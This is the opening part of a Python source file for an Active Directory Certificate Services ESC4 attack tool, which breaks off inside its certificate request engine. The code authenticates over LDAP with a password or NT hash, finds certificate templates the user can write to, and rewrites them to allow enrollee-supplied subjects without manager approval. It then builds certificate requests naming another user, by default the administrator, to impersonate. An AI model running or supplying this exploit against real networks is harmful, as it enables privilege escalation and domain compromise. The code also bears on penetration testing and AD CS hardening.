#!/usr/bin/env python3


import sys
import os
import re
import json
import base64
import struct
import socket
import time
import traceback
import getpass
from datetime import datetime
from typing import Optional, List, Dict, Tuple, Any, Set
from dataclasses import dataclass, field

# ─── Crypto imports ───────────────────────────────────────────────────────────
try:
    from cryptography import x509
    from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.serialization import pkcs12
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# ─── LDAP imports ─────────────────────────────────────────────────────────────
try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, MODIFY_REPLACE, BASE
    from ldap3.protocol.microsoft import security_descriptor_control
    LDAP_AVAILABLE = True
except ImportError:
    LDAP_AVAILABLE = False
    print("[-] ldap3 not installed: pip install ldap3")
    sys.exit(1)

# ─── Impacket imports ─────────────────────────────────────────────────────────
try:
    from impacket.dcerpc.v5 import transport, epm, rpcrt
    from impacket.uuid import uuidtup_to_bin
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False

# ─── Requests ─────────────────────────────────────────────────────────────────
try:
    import requests as req_lib
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# ─── requests-ntlm ────────────────────────────────────────────────────────────
try:
    from requests_ntlm import HttpNtlmAuth
    NTLM_AUTH_AVAILABLE = True
except ImportError:
    NTLM_AUTH_AVAILABLE = False

#
# ─── Signal handling for graceful Ctrl+C capture ──────────────────────────────
import signal
import threading

_interrupt_event = threading.Event()

def _signal_handler(signum, frame):
    """Capture SIGINT (Ctrl+C) and set the interrupt event."""
    _interrupt_event.set()
    # Re-raise KeyboardInterrupt so existing except blocks still catch it
    raise KeyboardInterrupt

# Register the handler for SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, _signal_handler)

# =============================================================================
# Color Output
# =============================================================================
class Colors:
    HEADER    = "\033[95m"
    OKBLUE    = "\033[94m"
    OKCYAN    = "\033[96m"
    OKGREEN   = "\033[92m"
    WARNING   = "\033[93m"
    FAIL      = "\033[91m"
    ENDC      = "\033[0m"
    BOLD      = "\033[1m"

def print_banner(text: str):
    print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.OKCYAN}{text}{Colors.ENDC}")
    print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}")

def print_success(text: str):  print(f"{Colors.OKGREEN}[+] {text}{Colors.ENDC}")
def print_info(text: str):     print(f"{Colors.OKBLUE}[*] {text}{Colors.ENDC}")
def print_warning(text: str):  print(f"{Colors.WARNING}[!] {text}{Colors.ENDC}")
def print_error(text: str):    print(f"{Colors.FAIL}[-] {text}{Colors.ENDC}")
def print_debug(text: str):    print(f"{Colors.OKCYAN}[DEBUG] {text}{Colors.ENDC}")

#
# =============================================================================
# Custom Exceptions
# =============================================================================
class ESC4Error(Exception):             pass
class ESC4UserCancelled(ESC4Error):     pass
class LDAPConnectionError(ESC4Error):   pass
class PermissionDeniedError(ESC4Error): pass
class CertificateRequestError(ESC4Error): pass
class InputValidationError(ESC4Error):  pass

#
# =============================================================================
# Input Validation
# =============================================================================
class Validator:
    """Centralised input validation with clear error messages."""

    @staticmethod
    def validate_ip(ip: str) -> str:
        """Validate IPv4 address."""
        ip = ip.strip()
        if not ip:
            raise InputValidationError("IP address cannot be empty.")
        # Allow hostname too but check it resolves / looks valid
        # First try strict IPv4
        parts = ip.split(".")
        if len(parts) == 4:
            try:
                import ipaddress
                ipaddress.IPv4Address(ip)
                return ip
            except ValueError:
                raise InputValidationError(
                    f"'{ip}' is not a valid IPv4 address. "
                    f"Example: 192.168.x.x"
                )
        raise InputValidationError(
            f"'{ip}' is not a valid IPv4 address. "
            f"Example: 192.168.x.x"
        )

    @staticmethod
    def validate_hostname(hostname: str) -> str:
        """Validate a DNS hostname (optional field)."""
        hostname = hostname.strip()
        if not hostname:
            return ""
        # RFC 952 / 1123: letters, digits, hyphens, dots
        pattern = r"^[a-zA-Z0-9]([a-zA-Z0-9\-\.]{0,253}[a-zA-Z0-9])?$"
        if not re.match(pattern, hostname):
            raise InputValidationError(
                f"'{hostname}' is not a valid hostname. "
                f"Example: WIN-DC01.domain.com"
            )
        return hostname

    @staticmethod
    def validate_username(raw: str) -> Tuple[str, str]:
        """
        Parse and validate username.
        Accepts: user@domain.com  or  DOMAIN\\user
        Returns: (username, domain)
        """
        raw = raw.strip()
        if not raw:
            raise InputValidationError("Username cannot be empty.")

        if "@" in raw:
            parts = raw.split("@", 1)
            username = parts[0].strip()
            domain   = parts[1].strip().upper()
        elif "\\" in raw:
            parts    = raw.split("\\", 1)
            domain   = parts[0].strip().upper()
            username = parts[1].strip()
        else:
            raise InputValidationError(
                f"Username format not recognised: '{raw}'\n"
                f"  Use: user@domain.com  OR  DOMAIN\\user"
            )

        if not username:
            raise InputValidationError("Username part cannot be empty.")
        if not domain:
            raise InputValidationError(
                "Domain part cannot be empty.\n"
                "  Use: user@domain.com  OR  DOMAIN\\user"
            )
        # Username: letters, digits, dots, hyphens, underscores
        if not re.match(r"^[a-zA-Z0-9._\-]{1,64}$", username):
            raise InputValidationError(
                f"Username '{username}' contains invalid characters."
            )
        # Domain: must contain at least one dot (FQDN) or be a NETBIOS name
        if "." not in domain and len(domain) > 15:
            raise InputValidationError(
                f"Domain '{domain}' doesn't look valid.\n"
                f"  FQDN example: domain.com\n"
                f"  NetBIOS example: CORP"
            )
        return username, domain

    @staticmethod
    def validate_password(password: str) -> str:
        """Password just cannot be empty."""
        if not password:
            raise InputValidationError("Password cannot be empty.")
        return password

    @staticmethod
    def validate_nthash(raw: str) -> str:
        """Validate NT hash (32 hex chars, optionally with LM prefix)."""
        raw = raw.strip()
        if ":" in raw:
            _, raw = raw.split(":", 1)
            raw = raw.strip()
        if not re.match(r"^[0-9a-fA-F]{32}$", raw):
            raise InputValidationError(
                f"NT hash must be exactly 32 hex characters. Got: '{raw}'"
            )
        return raw.lower()

    @staticmethod
    def validate_target_user(raw: str, domain: str) -> str:
        """
        Validate and normalise the target user to impersonate.
        Returns a UPN string.
        """
        raw = raw.strip()
        if not raw:
            raw = "administrator"

        if "@" in raw:
            parts    = raw.split("@", 1)
            username = parts[0].strip()
            dom      = parts[1].strip()
        elif "\\" in raw:
            parts    = raw.split("\\", 1)
            username = parts[1].strip()
            dom      = domain
        else:
            username = raw
            dom      = domain

        if not re.match(r"^[a-zA-Z0-9._\-]{1,64}$", username):
            raise InputValidationError(
                f"Target username '{username}' contains invalid characters."
            )
        return f"{username}@{dom}"

    @staticmethod
    def prompt_with_validation(
        prompt: str,
        validator,
        secret: bool = False,
        allow_empty: bool = False,
        default: str = "",
        max_attempts: int = 5,
    ):
        """
        Prompt the user, run validator, re-prompt on failure.
        Returns the validated (possibly transformed) value.
        """
        for attempt in range(1, max_attempts + 1):
            try:
                if secret:
                    raw = getpass.getpass(prompt)
                else:
                    raw = input(prompt)

                if allow_empty and not raw.strip():
                    return default

                result = validator(raw)
                return result

            except InputValidationError as e:
                remaining = max_attempts - attempt
                print_error(f"Invalid input: {e}")
                if remaining > 0:
                    print_warning(f"  Please try again ({remaining} attempts left).")
                else:
                    raise ESC4Error("Too many invalid inputs. Aborting.")
            except (KeyboardInterrupt, EOFError):
                print()
                raise ESC4UserCancelled("Input cancelled by user.")

#
# =============================================================================
# Constants
# =============================================================================
EKU_CLIENT_AUTH      = "1.3.6.1.5.5.7.3.2"
EKU_ANY_PURPOSE      = "2.5.29.37.0"
EKU_SMART_CARD_LOGON = "1.3.6.1.4.1.311.20.2.2"

CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x00000001
PEND_ALL_REQUESTS                 = 0x00000002

NON_RESTORABLE_ATTRS = {
    "nTSecurityDescriptor", "whenCreated", "whenChanged", "objectGUID"
}

TEMPLATE_ATTRS = [
    "cn", "name", "displayName", "distinguishedName",
    "pKIExpirationPeriod", "pKIOverlapPeriod",
    "msPKI-Enrollment-Flag", "msPKI-Private-Key-Flag",
    "msPKI-Certificate-Name-Flag", "msPKI-Certificate-Policy",
    "msPKI-Minimal-Key-Size", "msPKI-RA-Signature",
    "msPKI-Template-Schema-Version", "msPKI-RA-Application-Policies",
    "pKIExtendedKeyUsage", "nTSecurityDescriptor",
    "objectGUID", "whenCreated", "whenChanged", "msPKI-Cert-Template-OID",
]
CA_ATTRS = [
    "cn", "name", "dNSHostName", "cACertificateDN",
    "cACertificate", "certificateTemplates", "objectGUID",
]

# MS-WCCE ICertPassage interface UUID
ICERTPASSAGE_UUID    = "d99e6da0-1956-11d1-a808-00c04fb94f17"
ICERTPASSAGE_VERSION = "0.0"

CR_DISP_INCOMPLETE       = 0
CR_DISP_ERROR            = 1
CR_DISP_DENIED           = 2
CR_DISP_ISSUED           = 3
CR_DISP_ISSUED_OUT       = 4
CR_DISP_UNDER_SUBMISSION = 5
CR_DISP_REVOKED          = 6

CR_DISP_NAMES = {
    0: "INCOMPLETE", 1: "ERROR", 2: "DENIED",
    3: "ISSUED", 4: "ISSUED_OUT_OF_BAND",
    5: "UNDER_SUBMISSION (pending approval)", 6: "REVOKED",
}

#
# =============================================================================
# Data Classes
# =============================================================================
@dataclass
class ADUser:
    username: str
    domain:   str
    password: Optional[str] = None
    lmhash:   str           = "aad3b435b51404eeaad3b435b51404ee"
    nthash:   Optional[str] = None
    sid:      Optional[str] = None

    @property
    def upn(self) -> str:     return f"{self.username}@{self.domain}"
    @property
    def netbios(self) -> str: return f"{self.domain}\\{self.username}"

@dataclass
class TargetConfig:
    dc_ip:     str
    dc_host:   Optional[str] = None
    domain:    Optional[str] = None
    ldap_port: int  = 636
    use_ldaps: bool = True
    timeout:   int  = 30

@dataclass
class TemplateBackup:
    template_name:       str
    original_attributes: Dict[str, Any] = field(default_factory=dict)
    original_sd:         Optional[bytes] = None
    backup_time:         str = field(
        default_factory=lambda: datetime.now().isoformat()
    )

@dataclass
class ESC4Template:
    name:         str
    dn:           str
    display_name: Optional[str] = None
    enabled:      bool = False
    schema_version: int = 1
    certificate_name_flag: int = 0
    enrollment_flag:       int = 0
    extended_key_usage:    List[str] = field(default_factory=list)
    requires_manager_approval:      bool = False
    authorized_signatures_required: int  = 0
    validity_period:  Optional[bytes] = None
    renewal_period:   Optional[bytes] = None
    minimal_key_size: int = 2048
    security_descriptor: Optional[bytes] = None
    raw_attributes:      Dict[str, Any]  = field(default_factory=dict)
    has_vulnerable_acl:     bool      = False
    vulnerable_permissions: List[str] = field(default_factory=list)

@dataclass
class CertificateAuthority:
    name:         str
    dn:           str
    dns_hostname: Optional[str] = None
    subject_name: Optional[str] = None
    templates:    List[str]     = field(default_factory=list)

#
# =============================================================================
# Security Descriptor Parser
# =============================================================================
class ACEType:
    ACCESS_ALLOWED_ACE_TYPE        = 0x00
    ACCESS_DENIED_ACE_TYPE         = 0x01
    ACCESS_ALLOWED_OBJECT_ACE_TYPE = 0x05
    ACCESS_DENIED_OBJECT_ACE_TYPE  = 0x06

class CertificateRights:
    GENERIC_ALL    = 0x10000000
    GENERIC_WRITE  = 0x40000000
    WRITE_PROPERTY = 0x00000020
    WRITE_OWNER    = 0x00080000
    WRITE_DACL     = 0x00040000


def parse_sid(data: bytes, offset: int = 0) -> Tuple[str, int]:
    try:
        if len(data) - offset < 8:
            return "", 0
        revision  = data[offset]
        sub_count = data[offset + 1]
        authority = int.from_bytes(data[offset + 2:offset + 8], "big")
        subs, pos = [], offset + 8
        for _ in range(sub_count):
            if pos + 4 > len(data): break
            subs.append(struct.unpack_from("<I", data, pos)[0])
            pos += 4
        return (f"S-{revision}-{authority}" +
                "".join(f"-{s}" for s in subs)), pos - offset
    except Exception:
        return "", 0


def parse_ace(data: bytes, offset: int) -> Optional[Dict]:
    try:
        if len(data) - offset < 4: return None
        ace_type = data[offset]
        ace_size = struct.unpack_from("<H", data, offset + 2)[0]
        if ace_size < 4 or offset + ace_size > len(data): return None
        ace_data = data[offset:offset + ace_size]

        if ace_type in (ACEType.ACCESS_ALLOWED_ACE_TYPE,
                        ACEType.ACCESS_DENIED_ACE_TYPE):
            if len(ace_data) < 8: return None
            mask   = struct.unpack_from("<I", ace_data, 4)[0]
            sid, _ = parse_sid(ace_data, 8)
            return {"type": ace_type, "mask": mask, "sid": sid}

        elif ace_type in (ACEType.ACCESS_ALLOWED_OBJECT_ACE_TYPE,
                          ACEType.ACCESS_DENIED_OBJECT_ACE_TYPE):
            if len(ace_data) < 12: return None
            mask         = struct.unpack_from("<I", ace_data, 4)[0]
            object_flags = struct.unpack_from("<I", ace_data, 8)[0]
            pos          = 12
            if object_flags & 0x1 and pos + 16 <= len(ace_data): pos += 16
            if object_flags & 0x2 and pos + 16 <= len(ace_data): pos += 16
            sid, _ = parse_sid(ace_data, pos)
            return {"type": ace_type, "mask": mask, "sid": sid}
        return None
    except Exception:
        return None


def parse_security_descriptor(sd_bytes: bytes) -> List[Dict]:
    aces: List[Dict] = []
    try:
        if len(sd_bytes) < 20: return aces
        control     = struct.unpack_from("<H", sd_bytes, 2)[0]
        dacl_offset = struct.unpack_from("<I", sd_bytes, 16)[0]
        if not (control & 0x0004) or dacl_offset == 0: return aces
        if dacl_offset + 8 > len(sd_bytes): return aces
        ace_count = struct.unpack_from("<H", sd_bytes, dacl_offset + 4)[0]
        pos       = dacl_offset + 8
        for _ in range(ace_count):
            if pos + 4 > len(sd_bytes): break
            ace_size = struct.unpack_from("<H", sd_bytes, pos + 2)[0]
            ace      = parse_ace(sd_bytes, pos)
            if ace: aces.append(ace)
            pos += max(ace_size, 4)
    except Exception as e:
        print_debug(f"SD parse error: {e}")
    return aces

#
# =============================================================================
# Robust LDAP attribute helpers
# =============================================================================
def _val(entry, attr: str, default=None):
    try:
        v = entry[attr].value
        return v if v is not None else (entry[attr].raw_values or [default])[0]
    except (KeyError, AttributeError, TypeError, IndexError):
        return default

def _multival(entry, attr: str) -> List[str]:
    try:
        vals = entry[attr].values
        if vals: return [str(v) for v in vals]
        v = entry[attr].value
        if v is None: return []
        return ([str(x) for x in v]
                if isinstance(v, (list, tuple, set)) else [str(v)])
    except (KeyError, AttributeError, TypeError):
        return []

def _raw(entry, attr: str) -> Optional[bytes]:
    try:
        r = entry[attr].raw_values
        return r[0] if r else None
    except (KeyError, AttributeError, TypeError):
        return None

def _toint(v) -> int:
    if v is None:            return 0
    if isinstance(v, int):   return v
    if isinstance(v, bytes): return int.from_bytes(v, "little") if v else 0
    if isinstance(v, str):
        v = v.strip()
        if not v: return 0
        try:   return int(v, 0)
        except ValueError: return 0
    try:   return int(v)
    except Exception: return 0

#
# =============================================================================
# LDAP Manager
# =============================================================================
class LDAPManager:
    def __init__(self, user: ADUser, target: TargetConfig):
        self.user        = user
        self.target      = target
        self.conn:       Optional[Connection] = None
        self.base_dn:    str = ""
        self.config_dn:  str = ""
        self.domain_sid: str = ""
        self.user_sids:  List[str] = []

    def connect(self) -> bool:
        print_info(f"Connecting to LDAP server at {self.target.dc_ip}...")
        try:
            tls = ldap3.Tls(validate=0) if self.target.use_ldaps else None
            srv = Server(
                self.target.dc_ip,
                port=self.target.ldap_port,
                use_ssl=self.target.use_ldaps,
                tls=tls,
                get_info=ALL,
                connect_timeout=self.target.timeout,
            )
            pwd = (
                f"aad3b435b51404eeaad3b435b51404ee:{self.user.nthash}"
                if self.user.nthash else self.user.password
            )
            self.conn = Connection(
                srv,
                user=f"{self.user.domain}\\{self.user.username}",
                password=pwd,
                authentication=NTLM,
                auto_bind=True,
                auto_referrals=False,
            )
            print_success(f"Successfully bound to LDAP as {self.user.netbios}")
            nc = srv.info.other.get("defaultNamingContext", [""])
            self.base_dn   = (nc[0] if nc else
                              ",".join(f"DC={p}" for p in
                                       self.user.domain.lower().split(".")))
            self.config_dn = f"CN=Configuration,{self.base_dn}"
            print_info(f"Base DN: {self.base_dn}")
            print_info(f"Configuration path: {self.config_dn}")
            self._resolve_sids()
            return True
        except Exception as e:
            raise LDAPConnectionError(f"LDAP connection failed: {e}")

    def _resolve_sids(self):
        try:
            self.conn.search(
                self.base_dn,
                f"(sAMAccountName={self.user.username})",
                attributes=["objectSid", "memberOf"],
                controls=security_descriptor_control(sdflags=0x7),
            )
            if not self.conn.entries: return
            sid_raw = _raw(self.conn.entries[0], "objectSid")
            sid     = parse_sid(sid_raw)[0] if sid_raw else None
            self.user.sid  = sid
            self.user_sids = [sid] if sid else []
            if sid and sid.startswith("S-"):
                self.domain_sid = "-".join(sid.split("-")[:-1])
            self.user_sids += ["S-1-5-11", "S-1-1-0", "S-1-5-32-545"]
            if self.domain_sid:
                self.user_sids += [
                    f"{self.domain_sid}-513",
                    f"{self.domain_sid}-515",
                ]
            print_info(f"User SID: {sid}")
            print_info(f"Domain SID: {self.domain_sid}")
            print_info(f"Resolved {len(self.user_sids)} SIDs for user")
            print_debug(f"SID list (first 5): {self.user_sids[:5]}")
        except Exception as e:
            print_debug(f"SID resolution error: {e}")

    def disconnect(self):
        if self.conn:
            try: self.conn.unbind()
            except Exception: pass
            self.conn = None
        print_info("LDAP connection closed")

    def get_templates(self) -> List[ESC4Template]:
        self.conn.search(
            (f"CN=Certificate Templates,CN=Public Key Services,"
             f"CN=Services,{self.config_dn}"),
            "(objectClass=pKICertificateTemplate)",
            search_scope=SUBTREE,
            attributes=TEMPLATE_ATTRS,
            controls=security_descriptor_control(sdflags=0x7),
        )
        print_info(f"Found {len(self.conn.entries)} certificate templates")
        return [t for e in self.conn.entries if (t := self._parse_tmpl(e))]

    def _parse_tmpl(self, entry) -> Optional[ESC4Template]:
        try:
            name = str(_val(entry, "cn", "") or "")
            if not name: return None
            ekus = _multival(entry, "pKIExtendedKeyUsage")
            ef   = _toint(_val(entry, "msPKI-Enrollment-Flag", 0))
            t    = ESC4Template(
                name                          = name,
                dn                            = str(entry.entry_dn),
                display_name                  = str(_val(entry, "displayName", "") or ""),
                certificate_name_flag         = _toint(_val(entry, "msPKI-Certificate-Name-Flag", 0)),
                enrollment_flag               = ef,
                extended_key_usage            = ekus,
                authorized_signatures_required= _toint(_val(entry, "msPKI-RA-Signature", 0)),
                schema_version                = _toint(_val(entry, "msPKI-Template-Schema-Version", 1)),
                minimal_key_size              = _toint(_val(entry, "msPKI-Minimal-Key-Size", 2048)),
                requires_manager_approval     = bool(ef & PEND_ALL_REQUESTS),
                validity_period               = _raw(entry, "pKIExpirationPeriod"),
                renewal_period                = _raw(entry, "pKIOverlapPeriod"),
                enabled                       = bool(
                    EKU_CLIENT_AUTH      in ekus
                    or EKU_ANY_PURPOSE   in ekus
                    or EKU_SMART_CARD_LOGON in ekus
                    or not ekus
                ),
            )
            t.raw_attributes = {a: _val(entry, a) for a in TEMPLATE_ATTRS}
            sd = _raw(entry, "nTSecurityDescriptor")
            if sd:
                t.security_descriptor = sd
                self._check_acl(t, sd)
            return t
        except Exception as e:
            print_debug(f"Template parse error: {e}")
            return None

    def _check_acl(self, t: ESC4Template, sd: bytes):
        perms: List[str] = []
        for ace in parse_security_descriptor(sd):
            if ace["type"] in (ACEType.ACCESS_DENIED_ACE_TYPE,
                               ACEType.ACCESS_DENIED_OBJECT_ACE_TYPE):
                continue
            if ace["sid"] not in self.user_sids: continue
            m = ace["mask"]
            if m & CertificateRights.GENERIC_ALL:
                perms += ["WRITE_OWNER", "WRITE_DACL", "WRITE_PROPERTY"]
            if m & CertificateRights.WRITE_OWNER:   perms.append("WRITE_OWNER")
            if m & CertificateRights.WRITE_DACL:    perms.append("WRITE_DACL")
            if m & (CertificateRights.WRITE_PROPERTY |
                    CertificateRights.GENERIC_WRITE): perms.append("WRITE_PROPERTY")
        seen: Set[str] = set()
        unique = [p for p in perms if not (p in seen or seen.add(p))]  # type: ignore[func-returns-value]
        if unique:
            t.has_vulnerable_acl     = True
            t.vulnerable_permissions = unique

    def find_esc4_templates(self) -> List[ESC4Template]:
        vuln = [t for t in self.get_templates() if t.has_vulnerable_acl]
        for t in vuln:
            print_success(
                f"Found ESC4-vulnerable template: {t.name} "
                f"(Permissions: {', '.join(t.vulnerable_permissions)})"
            )
        return vuln

    def get_cas(self) -> List[CertificateAuthority]:
        self.conn.search(
            (f"CN=Enrollment Services,CN=Public Key Services,"
             f"CN=Services,{self.config_dn}"),
            "(objectClass=pKIEnrollmentService)",
            attributes=CA_ATTRS,
        )
        cas = []
        for e in self.conn.entries:
            try:
                ca = CertificateAuthority(
                    name         = str(_val(e, "cn", "")),
                    dn           = str(e.entry_dn),
                    dns_hostname = str(_val(e, "dNSHostName", "") or ""),
                    subject_name = str(_val(e, "cACertificateDN", "") or ""),
                    templates    = _multival(e, "certificateTemplates"),
                )
                cas.append(ca)
            except Exception as ex:
                print_debug(f"CA parse error: {ex}")
        print_info(f"Found {len(cas)} Certificate Authority(ies)")
        return cas

    def backup_template(self, t: ESC4Template) -> TemplateBackup:
        b    = TemplateBackup(template_name=t.name)
        keys = [
            "msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag",
            "msPKI-Private-Key-Flag",      "pKIExtendedKeyUsage",
            "msPKI-RA-Signature",          "pKIExpirationPeriod",
            "pKIOverlapPeriod",            "msPKI-Minimal-Key-Size",
        ]
        self.conn.search(t.dn, "(objectClass=*)",
                         search_scope=BASE, attributes=keys)
        if self.conn.entries:
            for k in keys:
                b.original_attributes[k] = _raw(self.conn.entries[0], k)
        b.original_sd = t.security_descriptor
        return b

    def modify_template_for_esc1(self, t: ESC4Template) -> bool:
        print_banner(f"MODIFYING TEMPLATE: {t.name}")
        mods: Dict[str, list] = {}
        new_flag = t.certificate_name_flag | CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
        print_info(f"Setting msPKI-Certificate-Name-Flag to 0x{new_flag:08x}")
        mods["msPKI-Certificate-Name-Flag"] = [(MODIFY_REPLACE, [str(new_flag)])]
        if t.requires_manager_approval:
            nef = t.enrollment_flag & ~PEND_ALL_REQUESTS
            print_info(f"Clearing manager approval flag → 0x{nef:08x}")
            mods["msPKI-Enrollment-Flag"] = [(MODIFY_REPLACE, [str(nef)])]
        if t.authorized_signatures_required:
            print_info("Clearing msPKI-RA-Signature")
            mods["msPKI-RA-Signature"] = [(MODIFY_REPLACE, ["0"])]
        if EKU_CLIENT_AUTH not in t.extended_key_usage:
            ekus = list(t.extended_key_usage) + [EKU_CLIENT_AUTH]
            print_info("Adding Client Authentication EKU")
            mods["pKIExtendedKeyUsage"] = [(MODIFY_REPLACE, ekus)]
        print_info(f"Applying {len(mods)} modifications...")
        self.conn.modify(t.dn, mods)
        if self.conn.result["result"] == 0:
            print_success("Template successfully modified for ESC1 exploitation")
            return True
        raise PermissionDeniedError(
            f"Modification failed: {self.conn.result['description']}"
        )

    def restore_template(self, b: TemplateBackup, dn: str) -> bool:
        print_banner(f"RESTORING TEMPLATE: {b.template_name}")
        res = {k: v for k, v in b.original_attributes.items()
               if k not in NON_RESTORABLE_ATTRS and v is not None}
        print_info(f"Restoring {len(res)} attributes...")
        print_info(f"Attributes: {list(res.keys())}")
        if not res:
            print_info("Nothing to restore")
            return True
        self.conn.modify(dn, {k: [(MODIFY_REPLACE, [v])] for k, v in res.items()})
        if self.conn.result["result"] == 0:
            print_success(f"Template {b.template_name} restored successfully")
            return True
        print_error(f"Restore failed: {self.conn.result['description']}")
        return False

#
# =============================================================================
# NDR helpers for MS-WCCE  (raw strings avoided to fix SyntaxWarning)
# =============================================================================
def _ndr_wstr(s: str) -> bytes:
    """Conformant varying wide string (NDR pointer target)."""
    enc   = (s + "\x00").encode("utf-16-le")
    count = len(enc) // 2
    pad   = (4 - len(enc) % 4) % 4
    return struct.pack("<III", count, 0, count) + enc + b"\x00" * pad

def _ndr_blob(data: bytes) -> bytes:
    """CERTTRANSBLOB encoding."""
    pad = (4 - len(data) % 4) % 4
    return (
        struct.pack("<II", len(data), 0x00020008)
        + struct.pack("<I", len(data))
        + data
        + b"\x00" * pad
    )

def _build_req(ca: str, template: str, csr: bytes) -> bytes:
    """Build NDR body for CertServerRequest (opnum 0)."""
    attrs = f"CertificateTemplate:{template}\r\n"
    return (
        struct.pack("<I", 0)            # dwFlags
        + struct.pack("<I", 0x00020000) # pwszAuthority referent
        + struct.pack("<I", 0)          # pdwRequestId in
        + _ndr_wstr(ca)
        + struct.pack("<I", 0x00020004) # pwszAttributes referent
        + _ndr_wstr(attrs)
        + _ndr_blob(csr)
    )

def _parse_resp(resp: bytes) -> Tuple[int, Optional[bytes]]:
    """Parse CertServerRequest response → (disposition, cert_der)."""
    try:
        if len(resp) < 8:
            return CR_DISP_ERROR, None
        pos         = 0
        req_id      = struct.unpack_from("<I", resp, pos)[0]; pos += 4
        disposition = struct.unpack_from("<I", resp, pos)[0]; pos += 4
        print_debug(
            f"RequestId={req_id}  Disposition={disposition} "
            f"({CR_DISP_NAMES.get(disposition, 'UNKNOWN')})"
        )

        def read_blob(buf: bytes, off: int) -> Tuple[Optional[bytes], int]:
            if off + 8 > len(buf): return None, off
            cb  = struct.unpack_from("<I", buf, off)[0]; off += 4
            ptr = struct.unpack_from("<I", buf, off)[0]; off += 4
            if ptr == 0 or cb == 0: return None, off
            if off + 4 > len(buf): return None, off
            off  += 4                          # skip MaxCount
            end   = min(off + cb, len(buf))
            chunk = buf[off:end]
            off  += cb + (4 - cb % 4) % 4
            return chunk, off

        _, pos        = read_blob(resp, pos)   # CertChain (skip)
        cert, pos     = read_blob(resp, pos)   # EncodedCert
        return disposition, cert
    except Exception as e:
        print_debug(f"Response parse error: {e}")
        return CR_DISP_ERROR, _scan_cert(resp)

def _scan_cert(data: bytes) -> Optional[bytes]:
    """Scan raw bytes for a DER X.509 certificate."""
    for i in range(len(data) - 4):
        if data[i] == 0x30 and data[i + 1] == 0x82:
            n = struct.unpack_from(">H", data, i + 2)[0] + 4
            if i + n <= len(data):
                try:
                    from cryptography import x509 as cx
                    cx.load_der_x509_certificate(data[i:i + n], default_backend())
                    return data[i:i + n]
                except Exception:
                    continue
    return None

#
# =============================================================================
# HTTP certsrv response analyser
# =============================================================================
def _analyse_certsrv_response(html: str) -> Tuple[str, Optional[str]]:
    """
    Parse the certsrv HTML response page.

    Returns:
        (status, request_id_or_None)
        status is one of: "issued", "pending", "denied", "unknown"
    """
    html_lower = html.lower()

    # Check for explicit denial patterns in the certsrv page
    # "Your certificate request was denied" is the exact MS phrase
    deny_phrases = [
        "certificate request was denied",
        "your request has been denied",
        "request denied",
        "denied by policy",
        "deniedbyoptionspolicy",
        "the request was for a certificate template that is not",
    ]
    for phrase in deny_phrases:
        if phrase in html_lower:
            return "denied", None

    # Pending approval
    pending_phrases = [
        "certificate pending",
        "your request has been received",
        "request id is",
        "disposition message",
        "under submission",
    ]
    for phrase in pending_phrases:
        if phrase in html_lower:
            m = re.search(r"ReqID=(\d+)", html, re.IGNORECASE)
            req_id = m.group(1) if m else None
            return "pending", req_id

    # Issued — certsrv redirects to certnew.cer or shows a download link
    issued_phrases = [
        "certnew.cer",
        "download certificate",
        "your new certificate",
        "certificate issued",
    ]
    for phrase in issued_phrases:
        if phrase in html_lower:
            m = re.search(r"ReqID=(\d+)", html, re.IGNORECASE)
            req_id = m.group(1) if m else None
            return "issued", req_id

    # Also look for a hidden ReqID without explicit status
    m = re.search(r"ReqID=(\d+)", html, re.IGNORECASE)
    if m:
        return "issued", m.group(1)

    return "unknown", None

#
# =============================================================================
# Certificate Request Engine
# =============================================================================
class CertificateRequestEngine:

    def __init__(self, user: ADUser, target: TargetConfig):
        self.user   = user
        self.target = target
        self._errors: List[str] = []

    def _note(self, method: str, err: str):
        msg = f"{method}: {err}"
        self._errors.append(msg)
        print_debug(msg)

    # ── CSR builder ──────────────────────────────────────────────────────────
    @staticmethod
    def _utf8str_der(s: str) -> bytes:
        """DER-encode a UTF8String (tag=0x0C) — no backslash escapes."""
        enc = s.encode("utf-8")
        n   = len(enc)
        if n < 0x80:
            return bytes([0x0C, n]) + enc
        if n < 0x100:
            return bytes([0x0C, 0x81, n]) + enc
        return bytes([0x0C, 0x82, (n >> 8) & 0xFF, n & 0xFF]) + enc

    def _build_csr(
        self, subject_cn: str, upn: str, key_size: int = 2048
    ) -> Tuple[bytes, Any]:
        if not CRYPTO_AVAILABLE:
            raise CertificateRequestError(
                "cryptography not installed: pip install cryptography"
            )
        print_info("Generating RSA key pair...")
        key = rsa.generate_private_key(65537, key_size, default_backend())
        csr = (
            x509.CertificateSigningRequestBuilder()
            .subject_name(x509.Name([
                x509.NameAttribute(NameOID.COMMON_NAME, subject_cn)
            ]))
            .add_extension(
                x509.SubjectAlternativeName([
                    x509.OtherName(
                        type_id=x509.ObjectIdentifier(
                            "1.3.6.1.4.1.311.20.2.3"
                        ),
                        value=self._utf8str_der(upn),
                    )
                ]),
                critical=False,
            )
            .add_extension(
                x509.ExtendedKeyUsage([ExtendedKeyUsageOID.CLIENT_AUTH]),
                critical=False,
            )
            .sign(key, hashes.SHA256(), default_backend())
        )
        return csr.public_bytes(serialization.Encoding.DER), key

    # ── RPC transport helper ─────────────────────────────────────────────────
    def _rpc_transport(self, string_binding: str):
        if not IMPACKET_AVAILABLE:
            raise CertificateRequestError("impacket not installed")
        rpct = transport.DCERPCTransportFactory(string_binding)
        rpct.set_connect_timeout(self.target.timeout)
        if self.user.nthash:
            rpct.set_credentials(
                self.user.username, "",
                self.user.domain,
                lmhash="aad3b435b51404eeaad3b435b51404ee",
                nthash=self.user.nthash,
            )
        else:
            rpct.set_credentials(
                self.user.username,
                self.user.password or "",
                self.user.domain,
            )
        return rpct

